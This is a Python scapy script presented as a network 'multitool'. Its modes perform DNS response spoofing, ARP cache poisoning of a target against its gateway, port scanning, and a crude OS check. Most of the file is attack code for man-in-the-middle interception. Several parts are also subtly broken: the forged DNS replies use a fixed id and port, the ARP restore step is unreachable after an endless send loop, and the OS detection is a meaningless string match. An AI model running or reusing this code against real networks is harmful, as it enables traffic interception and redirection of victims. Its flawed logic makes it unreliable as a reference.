from scapy.all import *
import threading
import argparse

# Function to send spoofed DNS response
def send_spoofed_dns_response(target_ip, gateway_ip):
    # Craft DNS response packet
    ip = IP(src=gateway_ip, dst=target_ip)
    udp = UDP(sport=53, dport=33333)
    dns = DNS(id=0xAAAA, qr=1, qdcount=1, ancount=1, nscount=0, arcount=0,
              qd=DNSQR(qname="www.example.com"),
              an=DNSRR(rrname="www.example.com", rdata="192.168.1.100"))
    packet = ip/udp/dns

    # Send the spoofed DNS response
    send(packet, verbose=0)

# Function to capture DNS requests
def capture_dns_requests(target_ip, gateway_ip):
    # Sniff DNS requests and send spoofed responses
    sniff(filter="udp and dst port 53", prn=lambda x: send_spoofed_dns_response(target_ip, gateway_ip))

# Function to perform ARP spoofing
def arp_spoofing(target_ip, gateway_ip):
    # Craft ARP packets
    arp = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/arp

    # Send the ARP packets
    sendp(packet, verbose=0, loop=1)

# Function to perform ARP restoration
def arp_restore(target_ip, gateway_ip):
    # Craft ARP packets for restoration
    arp = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=get_mac(target_ip))
    packet = Ether(dst=get_mac(gateway_ip))/arp

    # Send the ARP packets for restoration
    sendp(packet, verbose=0, count=5)

# Function to get MAC address of an IP
def get_mac(ip):
    # Craft ARP request packet
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Send the packet and receive the response
    ans = srp1(packet, verbose=0)
    return ans[ARP].hwsrc

# Function to perform port scanning
def port_scanning(target_ip):
    # Perform port scanning
    ans, unans = sr(IP(dst=target_ip)/TCP(dport=[22, 80, 443]), timeout=2, verbose=0)

    # Print the open ports
    print("Open ports:")
    for s, r in ans:
        if s[TCP].dport == r[TCP].sport:
            print(s[TCP].dport)

# Function to perform OS fingerprinting
def os_fingerprinting(target_ip):
    # Perform OS fingerprinting
    ans = sr(IP(dst=target_ip)/TCP(dport=[22, 80, 443]), timeout=2, verbose=0)

    # Check for common OS signatures
    if "Linux" in str(ans):
        print("OS: Linux")
    elif "Windows" in str(ans):
        print("OS: Windows")
    else:
        print("OS: Unknown")

# Main function
def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Python Multitool")
    parser.add_argument("-t", "--target", help="Target IP address", required=True)
    parser.add_argument("-g", "--gateway", help="Gateway IP address", required=True)
    parser.add_argument("-m", "--mode", help="Mode (dns, arp, port, os)", required=True)
    args = parser.parse_args()

    target_ip = args.target
    gateway_ip = args.gateway
    mode = args.mode

    if mode == "dns":
        # Perform DNS spoofing
        capture_dns_requests(target_ip, gateway_ip)
    elif mode == "arp":
        # Perform ARP spoofing and restore
        arp_spoofing(target_ip, gateway_ip)
        time.sleep(10)  # Wait for 10 seconds
        arp_restore(target_ip, gateway_ip)
    elif mode == "port":
        # Perform port scanning
        port_scanning(target_ip)
    elif mode == "os":
        # Perform OS fingerprinting
        os_fingerprinting(target_ip)
    else:
        print("Invalid mode. Use -h for help.")

# Run the main function
if __name__ == "__main__":
    main()
